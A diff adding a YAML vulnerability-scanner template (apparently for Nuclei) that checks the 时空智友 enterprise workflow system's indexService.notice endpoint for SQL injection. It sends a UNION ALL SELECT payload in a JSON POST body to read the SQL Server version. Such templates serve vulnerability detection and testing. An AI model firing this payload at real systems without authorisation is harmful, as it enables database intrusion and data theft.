@@ -1,0 +1,27 @@
+id: shikongzhiyou-indexService_notice-sql
+
+info:
+  name: 时空智友企业流程化管控系统 indexService.notice 存在sql注入漏洞
+  author: shikongzhiyou
+  severity: high
+  tags: shikongzhiyou
+
+http:
+  - raw:
+      - |
+        POST /formservice?service=indexService.notice HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/json
+
+        {"id":"1' UNION ALL SELECT NULL,NULL,@@version,NULL,NULL--"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "topictitle"
+          - "Microsoft SQL Server"
+          - "nickname"
+        part: body
+        condition: and
